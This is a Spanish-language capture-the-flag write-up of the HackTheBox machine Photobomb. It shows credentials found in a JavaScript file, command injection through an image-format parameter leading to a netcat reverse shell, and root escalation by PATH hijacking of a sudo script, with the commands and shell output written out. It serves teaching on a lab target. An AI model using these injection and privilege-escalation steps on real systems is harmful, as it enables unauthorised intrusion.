---
title: Writeup Photobomb
author: L4nder
date: 2023-02-12
img_path: /assets/img/HTB/photobomb
categories: [HackTheBox, Writeup, Easy]
tags: [HackTheBox, Writeup, Linux, Easy, RCE, Path Hijacking]
image:
  path: photobomb.png
  alt: Photobomb
---

Bueeeno, el dia de hoy nos haremos una maquina de dificultad **FACIL**!, de hecho, fue mi primera máquina activa que hice xD, le tengo nostalgia a la máquina.

Bueno, en esta máquina tocaremos los siguientes puntos:
- Virtual Hosting
- Code Injection (RCE)
- Y un Path Hijacking para la escalada de privilegios!

## Enumeración

Primero vamos a comprobar que la máquina esté encendida con una traza ICMP (ping).

```plaintext
❯ ping -c 1 10.10.11.182
PING 10.10.11.182 (10.10.11.182) 56(84) bytes of data.
64 bytes from 10.10.11.182: icmp_seq=1 ttl=63 time=34.4 ms

--- 10.10.11.182 ping statistics --- 
1 packet transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 36.212/36.212/36.212/0.000 ms
```

En el output del comando podemos ver el parámetro `ttl`, el cual indica que es equivalente a `63`, nos podemos guiar del siguiente esquema para diferenciar a que sistema operativo nos estamos enfrentando.

```plaintext
TTL(64) -> GNU/Linux
TTL(128) -> Windows
```

En nuestro caso, el TTL se aproxima a 64, pero sin serlo, esto pasa porque en plataformas como HackTheBox o TryHackMe la traza ICMP pasa por un nodo intermediario, el cual le resta 1 punto al TTL.

Bueno, como en todas las máquinas, tendremos que comenzar escaneando todos los puertos, primeramente escanearemos TCP.

```plaintext
❯ nmap 10.10.11.182
Nmap scan report for photobomb.htb (10.10.11.182)
PORT STATE SERVICE
22/tcp open ssh
80/tcp open http
```

Al hacer un curl a la web y fijarnos en las cabeceras, podemos observar que nos redirige a `photobomb.htb`, este termino se le conoce como **VIRTUAL HOSTING**, ya que en este caso no podemos acceder a la web por la IP.

```plaintext
❯ curl -s 10.10.11.182 -I | grep "Location"
Location: http://photobomb.htb/
```

Bueno, tendremos que añadir el dominio `photobomb.htb` al /etc/hosts

```plaintext
❯ echo "10.10.11.182 photoboomb.htb" | sudo tee -a /etc/hosts
```

Si nos fijamos en el código fuente encontramos un archivo .js con el siguiente contenido

```shell
❯ curl -s -X GET http://photobomb.htb/photobomb.js
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```

Si nos fijamos bien, encontramos la url `http://pH0t0:b0Mb!@photobomb.htb/printer`, al abrirla nos autentica automaticamente, y podemos ver lo siguiente

<img src="Web1.png">

En la parte de abajo podemos descargar las imagenes en formato png y jpg.

<img src="descargar.png">

## Explotación

Interceptando la petición podemos observar que para elegir el formato de la imagen se puede cambiar aquí.

<img src="burp.png">

Nos podemos imaginar que la web usa un binario para la conversión del formato de la imagen, si este es el caso, podemos concatenarle un comando.

Así que crearemos una reverse shell con nc y mkfifo en [Reverse Shells](https://revshells.com), recordad que esta ha de ser url encodeada.

<img src="rev.png">
<img src="rev2.png">

Para poner el cmoando despues del png ponemos un `;` y nuestro oneliner

<img src="burprev.png">

Al darle a forward recibimos la shell y conseguimos la primera flag!

```plaintext
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.182] 44954
wizard@photobomb:~/photobomb$ id
id
uid=1000(wizard) gid=1000(wizard) groups=1000(wizard)
wizard@photobomb:~/photobomb$ hostname -I
hostname -I
10.10.11.182 dead:beef::250:56ff:feb9:86ca
wizard@photobomb:~/photobomb$ cat ../user
cat ../user.txt
638**************************393
wizard@photobomb:~/photobomb$
```

## Escalada de Privilegios

Al mirar los privilegios que tenemos, observamos que podemos ejecutar un script, pero además tenemos la capacidad de setear variables de entorno

```plaintext
wizard@photobomb:~$ sudo -l
Matching Defaults entries for wizard on photobomb:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
(root) SETENV: NOPASSWD: /opt/cleanup.sh
wizard@photobomb:~$
```

Mirando el script podemos ver que usa find de manera relativa y no con su ruta absoluta.

```plaintext
wizard@photobomb:~$ cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb
# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
/bin/cat log/photobomb.log > log/photobomb.log.old
/usr/bin/truncate -s0 log/photobomb.log
fi
# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
wizard@photobomb:~$
```

Nos podemos aprovechar de nuestro privilegio de poder setear variables de entorno como el path para que nos ejecute el coamndo find personalizado, y bajo el contexto de root nuestro comando find personalizado se ejecutará como root

Para esto tendremos que crear un archivo find que tenga bash en su interior y le daremos permisos de ejecución.

```plaintext
wizard@photobomb:~$ echo bash > find
wizard@photobomb:~$ chmod +x find
wizard@photobomb:~$
```

Ahora cambiamos la variable path y ejecutamos el script, consiguiendo una consola como root

```plaintext
wizard@photobomb:~$ sudo PATH=$PWD:$PATH /opt/cleanup.sh
root@photobomb:/home/wizard/photobomb# id
uid=0(root) gid=0(root) groups=0(root)
root@photobomb:/home/wizard/photobomb# hostname -I
10.10.11.182 dead:beef::250:56ff:feb9:86ca
root@photobomb:/home/wizard/photobomb# cat /root/root.txt
0ad**************************058
root@photobomb:/home/wizard/photobomb#
```

Bueno, este ha sido mi primer writeup! Espero que os haya gustado!